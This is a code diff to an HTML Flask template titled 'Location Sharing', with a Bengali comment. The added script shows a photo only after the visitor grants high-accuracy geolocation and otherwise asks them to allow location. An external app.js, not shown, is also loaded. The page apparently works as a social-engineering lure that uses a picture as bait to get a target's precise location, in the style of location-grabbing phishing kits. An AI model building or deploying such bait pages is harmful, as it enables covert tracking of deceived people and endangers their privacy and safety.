@@ -2,14 +2,68 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Sharing</title>
-</head>
 
+    <style>
+        body{
+            margin:0;
+            padding:0;
+            background:#000;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            height:100vh;
+            font-family:Arial,sans-serif;
+        }
+
+        #photo{
+            display:none;
+            max-width:100%;
+            max-height:100vh;
+        }
+
+        #error{
+            color:#fff;
+            font-size:20px;
+            text-align:center;
+        }
+    </style>
+</head>
 <body>
 
-    <p id="error"></p>
+    <p id="error">Loading...</p>
+
+    <!-- আপনার ছবির নাম এখানে দিন -->
+    <img id="photo"
+         src="{{ url_for('static', filename='images/photo.jpg') }}"
+         alt="Photo">
 
     <script src="{{ url_for('static', filename='js/app.js') }}"></script>
+
+    <script>
+        function showPhoto() {
+            document.getElementById("error").style.display = "none";
+            document.getElementById("photo").style.display = "block";
+        }
+
+        function hidePhoto(message) {
+            document.getElementById("photo").style.display = "none";
+            document.getElementById("error").innerText = message;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            function () {
+                showPhoto();
+            },
+            function () {
+                hidePhoto("Please allow location to view this content.");
+            },
+            {
+                enableHighAccuracy: true
+            }
+        );
+    </script>
 
 </body>
 </html>
